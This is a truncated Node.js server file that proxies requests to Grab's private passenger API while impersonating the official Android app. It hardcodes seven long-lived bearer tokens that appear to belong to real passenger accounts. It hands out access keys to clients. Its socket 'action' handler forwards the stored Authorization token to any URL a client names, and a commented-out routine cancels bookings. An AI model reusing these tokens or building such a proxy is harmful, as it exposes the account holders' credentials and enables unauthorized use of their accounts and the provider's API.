const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const { exec, spawn } = require('child_process');
const cors = require('cors');
const axios = require('axios');
const app = express();
const server = http.createServer(app);
const io = socketIO(server);
const PORT = 8000;
let genKeys = {};
const KEYS = {
    'g_car_2788': 'eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kZWZhdWx0IiwidHlwIjoiSldUIn0.eyJhdWQiOiJQQVNTRU5HRVIiLCJjbmYiOiJMUzB0TFMxQ1JVZEpUaUJEUlZKVVNVWkpRMEZVUlMwdExTMHRDazFKU1VKRFZFTkNjMkZCUkVGblJVTkJaMFZDVFVGdlIwTkRjVWRUVFRRNVFrRk5RMDFCT0hoRVZFRk1RbWRPVmtKQlRWUkNSMXBvWVRKVmQwaG9ZMDVPZWtGM1RWUkJlRTFFUVhjS1RVUkJkMWRvWTA1T1JHZDNUVlJCZUUxRVFYZE5SRUYzVjJwQlVFMVJNSGREZDFsRVZsRlJSRVYzVW0xWlYzUnNUVVpyZDBWM1dVaExiMXBKZW1vd1EwRlJXVWxMYjFwSmVtb3dSQXBCVVdORVVXZEJSVmcxS3pKV09UbGpSVmRrV0d0eGVqSk9RWEJ5V0VWdE9IWmlWMFl4VjJ3NU9XVm5TbTFLTXpaRll6UjFXR3RIWVRoSFR6SXhURWRWT1dkR1RHWTFRbTAwYlZaWkNuSmFiSE5rV25oaVJrOVpWVkZIUVhSRGFrRkxRbWRuY1docmFrOVFVVkZFUVdkT1NFRkVRa1ZCYVVKNVdGTk9OVWRPTVhaelNsYzRZbVo2UzNaYWVqWlJWMG9yZGs1Q2RUSktUelVLUjFSdlNYSldOVWg1ZDBsblZXUkZWMnhGYUdRcllqbE1UVVZFYjA1VWNqaE9aa1ZXVkhkQlNGQkxhRXRRUkdoNGNYZGhWWGczZHowS0xTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVXRMUzB0TFE9PSIsImVzaSI6IlBBL1dibVB3akg2YkpPTElwNzhXSnBxK2t3cWlWdStSb2F6N0JMZWh1Y09iZ0ttV2p3PT0iLCJleHAiOjQ4ODg5MDI0MzIsImlhdCI6MTczNTMwMjQyOSwianRpIjoiOTNkYTEyZWUtMWJkNy00OTZjLWFlMmUtN2QwYWEzZmFmMGJmIiwibG1lIjoiUEhPTkVOVU1CRVIiLCJuYW1lIjoiIiwic3ViIjoiYWYyYzdkM2UtYjJiNS00OGM0LWJkNWYtMmE4MGE1MmJlOWQwIn0.ayAFPPa7yP1mgNNuwuQ-yE2joCpvNAfEZq0J5SlV16YpwYdVUHzxQ8Pgmo-7TnxVb4l0QrpsUhU4zu4fSzQi9Qn23emu5RbbjhrozRuXTvBDF7Nqg98vfNBCBvhvbsbA2MbJ4wrinh0Muec9cjXFraySgvPKOH2Q5p7mxhVBJT6LHOq_fd1OEwOGoXSz9utcoaSEmkJTyFpuUFyBcseSEWqHl_gyv2IKFsTgACinVcOBs7h2scJzPSFxnPw1U6CMXwFj5tIwGtkY-2gmgWU2sYhYMlUaOUI1D46VrficaryHaq1UV03OYrS4XbxKW-HtABs9qawQF0tU01Hs6DS7p0hu_V_eXWXm9_gICb20qUQvZi_4wSxmR2QSeTtqyxCpS9lBGaawIBOchAvlSMOX40H9wKF2eyUryZp7fswTYO35P9Tet4nRCBoWHDNN-HZnbctoz-UrjPIFYPB-Y35a3QSvK3hpgv0OF--XEOXGchFsS7GBk3ykUt-jGiD60YKjPqOl3K0N1v4AxYl4YOtQ96eCy_3K3Pyp23D9lhk289112rHu3pGKpgT1YDHzzCoGoMtIbtX9eeA3MXJ9TF0GTHSVXpE-zbDHVJUks41UvJPvZLJ45I1z8cc_Zp2jF9j2S-WyvX1-8UQzx4d1D87tyQeDbSQhBaCerMfN5SSThZY',
    'g_car_2700': 'eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kZWZhdWx0IiwidHlwIjoiSldUIn0.eyJhdWQiOiJQQVNTRU5HRVIiLCJjbmYiOiJMUzB0TFMxQ1JVZEpUaUJEUlZKVVNVWkpRMEZVUlMwdExTMHRDazFKU1VKRGVrTkNjMkZCUkVGblJVTkJaMFZDVFVGdlIwTkRjVWRUVFRRNVFrRk5RMDFCT0hoRVZFRk1RbWRPVmtKQlRWUkNSMXBvWVRKVmQwaG9ZMDVPZWtGM1RWUkJlRTFFUVhjS1RVUkJkMWRvWTA1T1JHZDNUVlJCZUUxRVFYZE5SRUYzVjJwQlVFMVJNSGREZDFsRVZsRlJSRVYzVW0xWlYzUnNUVVpyZDBWM1dVaExiMXBKZW1vd1EwRlJXVWxMYjFwSmVtb3dSQXBCVVdORVVXZEJSVTVuWnpZMmRIWjJPRmMyTHpsRFVXNDNjSEpUYjIxMWQzZ3dkM2MzUW1ZM2NHZEVPV1p6YkZWa05sZFRWVXRVV0VaeGREUkxSa3cwYlVsRlptaE9jSE5yUmxGT0NrSnljR3BwY3pGaGFuTk9iVlY2TTBabVJFRkxRbWRuY1docmFrOVFVVkZFUVdkT1NrRkVRa2RCYVVWQmJsSXZhVk16TTNjM1prMUZaMHg2Y2xJeFZGVkZXRTlhZEROcFVVVnhhV3NLYVU0emEyNUphMFpOTUdkRFNWRkRTVWxCWkVwSGVFY3hObHBQY2pkSWFtZGxRWFJXUkdabVEzUmxVbWhoVmxCRVJtZEZiVnBFYlhKc1p6MDlDaTB0TFMwdFJVNUVJRU5GVWxSSlJrbERRVlJGTFMwdExTMD0iLCJlc2kiOiIyUzJtc01tZDdMNnV2dW43MXBlSVJzRmYxWWh6U1dxMG52T3Y3NmpxQlpoaTFMVFlJZz09IiwiZXhwIjo0ODg5NTc5MTEzLCJpYXQiOjE3MzU5NzkxMTAsImp0aSI6ImQ5YjUxZDRjLWI3ZWItNDIyNC1iZTE4LTUyYzk4Y2NlZjA5YSIsImxtZSI6IlBIT05FTlVNQkVSIiwibmFtZSI6IiIsInN1YiI6ImQ5Yjk5NTYwLTA1OTQtNGE5My04MmRkLWE2MzQ1NmM0NWM4NyJ9.IoV_b0KbN4pbSwrqgbqLbaUdO2MGzsfh8OXx6eCrXI1OusIsZYUKFPGbpyxqRi3BnbzIy-4pQ8eWSHXyMRoUjB59wzB0Hv0T32KvzoKIqM4xz5wvgc2LGXAXzNVXCWTH43MkEobVnRDrlzVDuZBSZORX3JKh3qs0RP1YqDpHmQ5s2nBOGAKNdWJ6oUWCroocPWuEkqkWRglEeGVphdWQenhP6y89MZCHdAL-kvf-t1nIOiQ1K5Jy5CP13K_9Yaqo3SdPVNW-qayKqhbP92mnkyWW-0JtMUpNCk5SiVTeh-6Ekeq8u1TxCQ-7s5e6DMiOPU65Baw5roEkxWwDuqY5m2zAcGvLKfSEYfKl1eTaCOXCMKgTdOOMEaD5rkEb4XGRuGFPBtqFHUeBLODicVy-5t5R1XJ2cbce5l1VHx0B8L-iXuOzQb1Kz_SzU7r3qWkf64Pt2wh9eUlyvht53smJUknsnhvjTrPO5-jbglUUF1yEpMgEHcyDoT805G1TUa6c5m1htYcZEXMSF4KrBZJV-HL9zdzYgTSdumHVz4PxmPSlD3et23p1-rpbZ0QLsJCbOrFo8Lj068VvByr9kEeJAL5FwD4wN9tzupUkFWhHCmOAV8VxCk5SrNKkB004o_0XG5_fYyyVt2ytnducDJ6ahsxFvYNb08o8cged87cFxv8',
    'g_car_2763': 'eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kZWZhdWx0IiwidHlwIjoiSldUIn0.eyJhdWQiOiJQQVNTRU5HRVIiLCJjbmYiOiJMUzB0TFMxQ1JVZEpUaUJEUlZKVVNVWkpRMEZVUlMwdExTMHRDazFKU1VKRFZFTkNjMkZCUkVGblJVTkJaMFZDVFVGdlIwTkRjVWRUVFRRNVFrRk5RMDFCT0hoRVZFRk1RbWRPVmtKQlRWUkNSMXBvWVRKVmQwaG9ZMDVPZWtGM1RWUkJlRTFFUVhjS1RVUkJkMWRvWTA1T1JHZDNUVlJCZUUxRVFYZE5SRUYzVjJwQlVFMVJNSGREZDFsRVZsRlJSRVYzVW0xWlYzUnNUVVpyZDBWM1dVaExiMXBKZW1vd1EwRlJXVWxMYjFwSmVtb3dSQXBCVVdORVVXZEJSVWsyYm14Mk9WQlpNV3B2YTJZdlpWRTFSMFZSZFUxcWQxWjZXWGxDUkN0SGRHWnlLMGRHTVc1dmEwZHJUV1ozYjNkcE5HVm9XalpUU2sxbGNFNHliM0p5VTAwM0NsWlVXbmxyU0doNU4xZFJOVGhsTVZwYVZFRkxRbWRuY1docmFrOVFVVkZFUVdkT1NFRkVRa1ZCYVVGRWEzSlllV0pJTldwdE5GQXlNM1ZNY1VsdVZuSlBTM0pEZDFodVREWXdNMUVLU0V0TGNtaG5XbHB6UVVsblRGVmlTMDlRUzNwRE1XdG1aRVJSVEU5WFJUSk5kM1Z0UzAwdmNrTndUV015ZEd4UFpGRTVZVkp0ZHowS0xTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVXRMUzB0TFE9PSIsImVzaSI6ImpIbjRvZ3g5SXJRRDNHTzdMMXdBR1dtam9DUUVzZW92RW43OFcxdU00Y3c2Ujk4Uzl3PT0iLCJleHAiOjQ4ODg4MDYwMTEsImlhdCI6MTczNTIwNjAwOCwianRpIjoiNmNkNDQzYzktNWYxZS00Y2RlLWJjMWQtMzQ2MzVhOTM0NTYxIiwibG1lIjoiUEhPTkVOVU1CRVIiLCJuYW1lIjoiIiwic3ViIjoiNzIzZTk3MzYtMjgyMS00YTI2LTk3MjctMDM5MTZlNTVmM2VlIn0.DMhV67Rbce3mRVxl3KAH7ui0v5h1UZ3Evz-dmmRrdN-gkKoUv0GeSxULobj-E1nsxLYDabyV3YDFtKn8Y5Is2R3o7EPbrg4Xyu0K-bSAhneOqEtlCjDjx-4w_-etQvrEEeICW-paHi3Y7NuMeo8wCs-tYz00TjU3tukLhuDS_8MG-udjRh9-97qnzn67U64rS7MQIcCBNGs0kZU4yjNbU9_P5YGtOpN36dzIcQ0ntOhgI3cjHVPJcy7pmRRGZCIdvg6xBBYO8KtrBy5YoKmWx_7cabUoat-BkOlGGC4yP1PS7ZAcVhCBvQr3B9cNUMr7YPTsO2gT7hMAE3d49BnHFJjcz8BfBebeccTs0XojND148JRHBXnPUrifvfzdZxgvf9pBJixoLcDAHnLr-yRqAwvqjdZ4v9VjNI67EY75EZdAekyDWdMgIBPNlW08RcQS-yvEH4z6KXgkFxYTHPda9yvFNr9Z7n2tg1vpDS24VgMVlIT00Mqo5yu7-GFfLIdDerdbzBhLTfXTWwGijG-aRCWxCqEnvhuWolHSfttYsYOuUJ23BmcrBDguZdJf3_UH2Kj2FiySBSzR2TAsH8Ad1nJsvTQMsQPmCZwM9_qbOzK0GAzaAQdmj7CnwYMJJY3qZ4SiQqysGQqyCwrl5V0deBhi7fN2ScTGDE9GMdNwzyA',
    'g_car_2714': 'eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kZWZhdWx0IiwidHlwIjoiSldUIn0.eyJhdWQiOiJQQVNTRU5HRVIiLCJjbmYiOiJMUzB0TFMxQ1JVZEpUaUJEUlZKVVNVWkpRMEZVUlMwdExTMHRDazFKU1VKRFZFTkNjMkZCUkVGblJVTkJaMFZDVFVGdlIwTkRjVWRUVFRRNVFrRk5RMDFCT0hoRVZFRk1RbWRPVmtKQlRWUkNSMXBvWVRKVmQwaG9ZMDVPZWtGM1RWUkJlRTFFUVhjS1RVUkJkMWRvWTA1T1JHZDNUVlJCZUUxRVFYZE5SRUYzVjJwQlVFMVJNSGREZDFsRVZsRlJSRVYzVW0xWlYzUnNUVVpyZDBWM1dVaExiMXBKZW1vd1EwRlJXVWxMYjFwSmVtb3dSQXBCVVdORVVXZEJSWEpMTkRCR1drSk1NbTlZYW5GbWFEWlhjRWRKVTNGYU9WbEJSakJhVUhCc1pUQklaM293WW1sa1JYUnNia05VYUcwMVNuUTNaMGhWYjFadlJFeHJMM1ZtY0ZVNENtNTRRVFpxTXpCaFVHOTVNRWxIV1NzcmFrRkxRbWRuY1docmFrOVFVVkZFUVdkT1NFRkVRa1ZCYVVKUFRFVkViRk16VFcwelYwb3dSbWhNVTBGcVVGQmFkMkp3ZVRWc1duZFBRVWtLZUhSYVFWbHZNUzgzVVVsblRsRTVkbnBaYzI5T2MxTXlkSFpZTm5ORFdYY3hRMDFVUWk5UllWWnZTa3BEWjFSeloxcFZjM2hrUlQwS0xTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVXRMUzB0TFE9PSIsImVzaSI6Imc0em42U09lY1EvL2hHQVh2aExTS2tXbDBRV3d3WU12bUE3dTFSV0g2ckU4a1RKVUxRPT0iLCJleHAiOjQ4NzM0OTQ3NDQsImlhdCI6MTcxOTg5NDc0MSwianRpIjoiMjYyMmY4MGUtN2FhYi00NTBhLWI2MGQtOGUxNDFkZDUwYzY3IiwibG1lIjoiUEhPTkVOVU1CRVIiLCJuYW1lIjoiIiwic3ViIjoiNDRhYzk5NmItNmYzNi00YzY0LTk3ZTEtMzM0NzQ0NGEzZDY5In0.lDCD3CcVDIO7dwp0ZlsdC6ejmLe57xriAUKd4B1OP90Sd74G9wVjGb-lfCIyJ9UX-PpM6Xt63DD45vtQn8HlPqbioJ3rhRQXCgr5w_4tOoAhYpRY0-q0mW0KVXVPKbDOMTdjsK_ZtU3lvVpe7KlfpCRXgsRxs_J6s8mBBluRI5R4Gu4xeKggsoxbbt8ZGiQ8ru1rfRGeZ_5a8FFRKwXXgXD83s3cEMatDbmePcvYiXoF9XS1YKsytnKWBTaNdFTttoDX2CVK1eFuOHGM7lRTeMweoHPsabrt5NLucFH6H60GOKvUtBTmDQFb1GV2jl7w0Ev4ciJSDs4-7kgkl2TENkGnnWA4euwBF-NOf9N9CnfzPNb9VqPsySqyfpcE1xxSE9fe-fun3u8suuDFtIb7qH7ajUj4fbUeJlpAGymtJvuYJ38PzlkHf9Etv23DLR6tVF5CzkcqK6hg0d6ZcJDn2qGlRZQtV1SVB1kEGQCDV9Ith10vpfbywsmvr9-CVUXor3P4-hlcnRcC6GpDsBUSmK6qxK1u-df8hHyAP8rW33dbxUN18t6CGqurkC3feD5fceX6VwdVj4uiJb9-ZNZ2CQmGbUUp7jCUniQcni3xA3jYBBgHCGe93aAPap8FzE3ucb56JUsEjjzAPpvAzkTF06EbtiSIbxPRJQTV1gxtLtg',
    'g_car_2702': 'eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kZWZhdWx0IiwidHlwIjoiSldUIn0.eyJhdWQiOiJQQVNTRU5HRVIiLCJjbmYiOiJMUzB0TFMxQ1JVZEpUaUJEUlZKVVNVWkpRMEZVUlMwdExTMHRDazFKU1VKRGFrTkNjMkZCUkVGblJVTkJaMFZDVFVGdlIwTkRjVWRUVFRRNVFrRk5RMDFCT0hoRVZFRk1RbWRPVmtKQlRWUkNSMXBvWVRKVmQwaG9ZMDVPZWtGM1RWUkJlRTFFUVhjS1RVUkJkMWRvWTA1T1JHZDNUVlJCZUUxRVFYZE5SRUYzVjJwQlVFMVJNSGREZDFsRVZsRlJSRVYzVW0xWlYzUnNUVVpyZDBWM1dVaExiMXBKZW1vd1EwRlJXVWxMYjFwSmVtb3dSQXBCVVdORVVXZEJSVFpsUkU1NlFsY3hNRXd3Wm5WYVQzQjJPVzFOZVc5cVkwbERaM3BETmtwNVZWY3hWM28xTlUxR1ZXRjJibTB6T1U1T2EzWk5kVzFGWkVwSmMzTnZWVkpvWlVzekNrOUpZWFZoTHpBMmVHTnBXRUZRU0cwcmVrRkxRbWRuY1docmFrOVFVVkZFUVdkT1NVRkVRa1pCYVVWQmFIRnlaa2wyZVd4eGMwZzNUVTlNYXk5bFJtSjJibVlyVFZvM1VXZzVLMEVLUzBwdmRubHZVRUpwUW10RFNVTkhZMnQzU2tzMU5WZHZUV28zZGtOaldYcFJSR2N4VWt3ME9YZEViRmsyVW1WTWFVaEdWR04wTW13S0xTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVXRMUzB0TFE9PSIsImVzaSI6IkpQSTVSRW5xZVQ3YWdYNzBWYTg1N3dBU29ZU3pTRWh5RXk5eWVpMzZZbE9SUkd4K1RnPT0iLCJleHAiOjQ4ODk2OTM3MzksImlhdCI6MTczNjA5MzczNiwianRpIjoiYjkwMTAyODAtYWM4YS00NmQ2LWIwM2YtODFhMjc4YmIwM2RkIiwibG1lIjoiUEhPTkVOVU1CRVIiLCJuYW1lIjoiIiwic3ViIjoiMDRiMzY2NGEtNzI3Yi00MDUzLWE0OTQtZjNjNzE4MTE2ZWQxIn0.Pbc1MVF_t3hZ_Ef2jlLH_FDWHpuWLQFK_abqYwoLWyzLhYHWtOa52H6Wz71Jae7wP6ZSze-Tb4bFrbDTsKr3bfL91OyK6FU1ZZxlXsBDLnLot6qq4kJRshHqJrKELtrLbVTDHjIaIWnwKCn1k0h-oDNi1S0b0F9ZFlevnkjNKXY6wCvoPv_qE_S9Ub8hZE9swuVgA4Awdqqtdw6XmH7jbWI2wdQ2EX89ao7r1cU05Bi9CnlZDfmeDCUcxFiHxe6QMtGjVaYRSYfcnSAk49k7_JpwL4gJjeB5LJFGw88CozEenmkuoZQOpZXVvUtG5bOXZfOMHT72Q8WMZ71VfbbkiflxfAfmR9FxnXtXNKkJPtGKcvRm8p46C-XALys-JSJl5inQ9E1KoXZ02RpFD9mG_tgO7q6Zwec4PA4sf7hqwZQX4n7Xb2E13wIG09RRFe7NTjEQz9VuoYMsrOOgj98ajN4BDILPmctIC1zJ26sZfpoWvWAnK68ODXdznzUPNzqvE9wvmWl4DR3ISG4diarO7bOrQA5Kzq4bSzt5IFSnU4tbwP9ejP_OSye2kwuL7bbEZOMDrFjh-QYS9-U7OMM5BZAeKZv9yuasLtQkVe6M4tjZYZLYJHFIX-B1cc1Bji14Ku1AKkxreahrbHhwQl8uAgYItCS0Z6y2TlVJXOSeQ_o',
    'g_car_2703': 'eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kZWZhdWx0IiwidHlwIjoiSldUIn0.eyJhdWQiOiJQQVNTRU5HRVIiLCJjbmYiOiJMUzB0TFMxQ1JVZEpUaUJEUlZKVVNVWkpRMEZVUlMwdExTMHRDazFKU1VKRGFrTkNjMkZCUkVGblJVTkJaMFZDVFVGdlIwTkRjVWRUVFRRNVFrRk5RMDFCT0hoRVZFRk1RbWRPVmtKQlRWUkNSMXBvWVRKVmQwaG9ZMDVPZWtGM1RWUkJlRTFFUVhjS1RVUkJkMWRvWTA1T1JHZDNUVlJCZUUxRVFYZE5SRUYzVjJwQlVFMVJNSGREZDFsRVZsRlJSRVYzVW0xWlYzUnNUVVpyZDBWM1dVaExiMXBKZW1vd1EwRlJXVWxMYjFwSmVtb3dSQXBCVVdORVVXZEJSWEIyZGpGbEt6bGFXWFJIVlhveE1pdEtZWEZGVFRGbVVIbENRVXBoUmt4aVYzQmtRMWhwUTJ4dVFrSlNZblpyYzNsdFYxVjViVVo1ZUdVd1VGQTFLMm81ZFdoMUNuVk5ja1JLVmtaWmFrMVNUMnhwVTNWSWVrRkxRbWRuY1docmFrOVFVVkZFUVdkT1NVRkVRa1pCYVVJeFlteHZiMmsyYlZVeU1GcDFMMU0xTVVWM1lrWXJRMU5WU3pacFVUWjNlRGdLYzI1aFRERlpVVVJzZDBsb1FVczBUakkxVTNGdFNGTkxSWE55V1V4NFMxUllZa2cyZURKdFRXSldZVTVhT1hodFFYb3lla1ZoTDJvS0xTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVXRMUzB0TFE9PSIsImVzaSI6InpnUU5Xdnd0ZFNUQWFFWmYrTFdSbktsak5uY2VoS2YrbGV6dXljYk1qbnRFNmh1U3JBPT0iLCJleHAiOjQ4OTAwMDYwNzksImlhdCI6MTczNjQwNjA3NiwianRpIjoiZTcwZDg5YWYtMDc0Yy00YmIzLTkyYmQtMzMwOTZhMjg0OTg2IiwibG1lIjoiUEhPTkVOVU1CRVIiLCJuYW1lIjoiIiwic3ViIjoiZWI2NjUwNzUtOThiZC00Y2Q1LWFkYTctOTRmNTU0ZGNmNDQwIn0.tkxeyVl7LG2IQ38p3YqTEgYgshKhK8xW0Z_PQqWnpYa3p6NIUzihZfEhMOGimfDORK2ZA_HupgaA3_8G1HIV-i24Y9mT1FLnpUAAX5XAZlq1rN2_5u08rP8hORojnV0g8MCQF092B826yR0KO7FYrCET3MnnFBsYIQnMVAfxEZ6ZQgT-StcKSdYk5seIAqv6UHZd8kxndeyi5pKRWdRV9NYk4opn5pW30wdVyoYjCr4_2sPfVLzi4tcosveup76KogxcCRZNxWUB4lp9d_Mw5nDtDZfqFb_tLOcYAxizGdM3IzhTn2H5WyofFo-r9sl-ZRE4jIcodMF58aXu5KituaoWu7ezoO_RfZHFZAgb3DSJjx6iQYjXbaahe-gWxxCVqfsAWJtTZG7zXiQ8KUvNIlea7cPOPYOxK-8s-15ai4icUK5PNavG3ToB0toTj4jCswciWNXsPrvXMmOw8qDDDrb-vffgoWxJroq-YTYmHwYtNO65m-AH5sRPG0-q8WXzPo-Ke-AcX5DdanO5W-BWz0c4pVbixf64SM_eljaPhoYQl4OgdsIPJMmopsPo1MpP5mUw3SkpPy3e8GpnUialna8hivbMJGk0G41yAndrjupVscHQOzgwJbNGX42ayMkYc08kppPZg7pl2XNd5Gz00jQNgZUQfvlIF8qK2H6JLNE',
    'gcar7': 'eyJhbGciOiJSUzI1NiIsImtpZCI6Il9kZWZhdWx0IiwidHlwIjoiSldUIn0.eyJhdWQiOiJQQVNTRU5HRVIiLCJjbmYiOiJMUzB0TFMxQ1JVZEpUaUJEUlZKVVNVWkpRMEZVUlMwdExTMHRDazFKU1VKRGFrTkNjMkZCUkVGblJVTkJaMFZDVFVGdlIwTkRjVWRUVFRRNVFrRk5RMDFCT0hoRVZFRk1RbWRPVmtKQlRWUkNSMXBvWVRKVmQwaG9ZMDVPZWtGM1RWUkJlRTFFUVhjS1RVUkJkMWRvWTA1T1JHZDNUVlJCZUUxRVFYZE5SRUYzVjJwQlVFMVJNSGREZDFsRVZsRlJSRVYzVW0xWlYzUnNUVVpyZDBWM1dVaExiMXBKZW1vd1EwRlJXVWxMYjFwSmVtb3dSQXBCVVdORVVXZEJSWEZFTVdNMVJXZG5kMFJCTTBkRmEwUkZORTlYVUhGbFFVUXpSVWxGUzBadU5XOHhLM1o0YzJWNk5WUmlOVlJoZVdVNVpFNHhXRUpvYkV0eFRWRnlLMFp6UjJoT0NsSXZNMlE1YmpKWmFTODFXa3d4VTBKRGFrRkxRbWRuY1docmFrOVFVVkZFUVdkT1NVRkVRa1pCYVVWQmQyb3JTM2sxV2l0RWJUVllTVXRRZEZGTGQxbHFWR1JTUm5KS1psVlJlV3dLVW01RU9FWklSSGM0V0c5RFNVSndWbkl3VG05REswRldkRGxqUWtabWMwaDNWSFZsVFdWMVFuQnFkMkYzV0hVd1dqaHdSMnB5YVdZS0xTMHRMUzFGVGtRZ1EwVlNWRWxHU1VOQlZFVXRMUzB0TFE9PSIsImVzaSI6IjkvUWROalVVeWpXTXpxK3I2K1ViL1c2T0R4UHFJWko1bUt4dG1DSTBSNW5oTDZuUERRPT0iLCJleHAiOjQ4OTAyNTc1MjIsImlhdCI6MTczNjY1NzUxOSwianRpIjoiNDAwZjNlZWYtZThjZi00Y2U5LTliZDktNTRlOWE2ZTFlMzY2IiwibG1lIjoiUEhPTkVOVU1CRVIiLCJuYW1lIjoiIiwic3ViIjoiMTllOTM0NzEtOTg0Zi00ZjBhLWI2MDctZGY1YmZlNzgyZDhkIn0.t8qJtRlRlmg0VW7LXZ3zYgdm_iaFK_7iYFc1JVnoqwrGkMr12O91VlnHXcCKc-RSUAz2uY5LOandihGEERsOtopMVMcRlHVYmKXjF7l1ixvzvkKxnFcXsQKzC1mUqxTWkXv2nRNVm1XvZ6JNn4VWtEBwqwMIBPkkgAhGwTzJBdomObOhOH5b8q4ekon41kXS1K4I4Wf_dvFVVo6Vyg3Jx7fL-x0Gq2E-MEb20FnnUTiyzon5ZPyisSW7iPX_oqTIWdNBbZzZPySHqD_jEHSqmmzC88vtFLtJNS3jDsyQtsaiVNTfUgn6T7qCkDWpX8sCZX9QymC8jLYl3VpvKWZa6kKs1CEWX7a0-VA__usiOgZY1dNWZpNrbpRT9MEN7klNCSHNvY4k-tocJyWK1YMAqJd0tRyW-B4UxbTFyEW4bqj2jGZe5TeyP1gW4gbiDE9pmB9UaAnoSt8xYfWWTjSH_4BzxMXH-wAKXcWgAvJFCls2faEpqLK-pvrgzp3mhd5EO2TOv6dyRxbIGGc3u6wUZszVz_0iOoDWv5artufxzTdtSdttB7hfol3A99jsr_jyWjwR1_muNChYwJqm935-crMksze24fkk-DZx5wfILc9UPg_ZFmkxjxZ-HJOgI07ds9YTazhsIP5UZA5EAXG1PNuYdxzy7WPY-JBKHOKxIcA',
};
const API_URL = 'https://p.grabtaxi.com/api/passenger/v2/poi/search';

app.use(cors()); 
app.use(express.json());

const waitForValue = async (valueGetter, interval = 100) => {
    return new Promise((resolve) => {
        const checkForValue = () => {
            const value = valueGetter();
            if (value !== null && value !== undefined) {
                clearInterval(intervalId);
                resolve(value);
            }
        };
        const intervalId = setInterval(checkForValue, interval);
        checkForValue();
    });
};
const DEFAULT_USER_AGENT = 'Grab/5.335.0 (Android 11; Build 91095616)';

const Request = async (url, options = {}) => {
    try {
        console.log('Sending request to:', url);
        let headers = {};
        if (Array.isArray(options.headers)) {
            headers = options.headers.reduce((acc, header) => {
                const [key, value] = header.split(':').map((str) => str.trim());
                if (key && value) {
                    acc[key] = value;
                }
                return acc;
            }, {});
        } else if (options.headers && typeof options.headers === 'object') {
            headers = { ...options.headers };
        }
        headers['User-Agent'] = DEFAULT_USER_AGENT;
        options.headers = {
            ...headers,
            ...(options.headers || {}),
        };
        let cleanedObj = Object.fromEntries(
            Object.entries(options.headers).filter(([key, value]) => isNaN(key))
        );
        
        const response = await axios({
            url,
            method: options.method || 'GET',
            headers: cleanedObj,
            data: options.postfields || null,
            validateStatus: () => true, // This will allow all HTTP status codes
        });
        
        // Automatically handle JSON or text
        const contentType = response.headers['content-type'] || '';
        if (contentType.includes('application/json')) {
            return JSON.stringify(response.data); // Axios automatically parses JSON
        } else {
            return response.data.toString(); // Treat as plain text
        }
    } catch (error) {
        console.error('Error making request:', error.message);
        throw error;
    }
};
app.get('/api/search', async (req, res) => {
    let AUTH = genKeys[req.query.key]?.auth ? genKeys[req.query.key]['auth'] : '';
    //console.log(JSON.stringify(genKeys));
    try {
        const url = `${API_URL}?reference=14.546134135961552%2C121.19037125396864&${new URLSearchParams(req.query).toString()}&type=pickup&source_app=transport`;
        //console.log(`Constructed URL: ${url}`);
        
        const response = await Request(url, {
            headers: [
                'X-Mts-Ssid: ' + AUTH,
                'Authorization: ' + AUTH,
                'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)'
            ]
        });
        try {
            const jsonResponse = JSON.parse(response);
            res.setHeader('Content-Type', 'application/json');
            res.send(jsonResponse);
        } catch (e) {
            console.error(`Error parsing response to JSON: ${e}`);
            res.status(500).send({ error: 'Failed to parse response to JSON' });
        }
    } catch (error) {
        console.error(`Error handling request: ${error}`);
        res.status(500).send('Internal Server Error');
    }
});
/*(async () => {
    //A-7CIJNB9GWE2T
    let AUTH = genKeys[key]['auth'];
        console.log('cancelling..')
        try {
            var cancelSure = await Request('https://api.grab.com/api/v3/public/validatePaxCancellation', {
                method:'POST',
                postfields: '{"bookingCode":"A-7CIJNB9GWE2T","cancelReasonID":25,"cancelReasonType":"static","dimension":"xxxhdpi","paymentTypeID":"260789879"}',
                headers: [
                    'Content-Type: application/json; charset=UTF-8',
                    'X-Mts-Ssid: ' + AUTH,
                    'Authorization: ' + AUTH,
                    'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
                ],
            });
            var jsonCancel = JSON.parse(cancelSure);
            
            var cancel = await Request('https://p.grabtaxi.com/api/passenger/v3/rides/' + bookId, {
                method: 'DELETE',
                postfields: '{"cancellationFeeSalt":"' + jsonCancel.salt + '","passengerFeedback":{"comment":null,"mcqResponses":[' + id + '],"type":"CANCEL_REASON"},"reason":null}',
                headers: [
                    'Content-Type: application/json; charset=UTF-8',
                    'X-Mts-Ssid: ' + AUTH,
                    'Authorization: ' + AUTH,
                    'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
                ],
            });
            console.log(cancel)
            
        } catch (err){
            
        }
})();*/

io.on('connection', async (socket) => {
    let AUTH;

    socket.on('userData', async (data) => {
        if (genKeys[data]?.auth) {
            socket.emit('keyValidation', { valid: true, message: 'Userdata set successfully' });
        } else {
            socket.emit('keyValidation', { valid: false, message: 'Invalid or Expired key.' });
        }
    });
    socket.on('action', async (data) => {
        //console.log('Received data from client:', data);
        let result, AUTH;
        try {
            AUTH = genKeys[data.key]['auth'];
        } catch (err) {
            console.log(err)
        }
        const { requestId } = data;
        if (data.data) {
            result = await Request(data.url, {
                method: data.data ? 'POST' : 'GET',
                postfields: data.data ? data.data : '',
                headers: [
                    data.data ? 'Content-Type: application/json; charset=UTF-8' : '',
                    'X-Mts-Ssid: ' + AUTH,
                    'Authorization: ' + AUTH,
                    'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
                ],
            });
        } else {
            result = await Request(data.url, {
                headers: [
                    'User-Agent: Grab/5.335.0 (Android 11; Build 91095616)',
                    'X-Mts-Ssid: ' + AUTH,
                    'Authorization: ' + AUTH,
                ],
            });
            if (data.url.includes('/passenger/v3/rides/A-')) {
                genKeys[data.key]['timestamp'] = Date.now();
            }
        }
        socket.emit('actionResponse', { success: true, response: result, requestId });
    });
    socket.on('cancel', async (key, id, bookId) => {
        let AUTH = genKeys[key]['auth'];
        console.log('cancelling..')
        try {
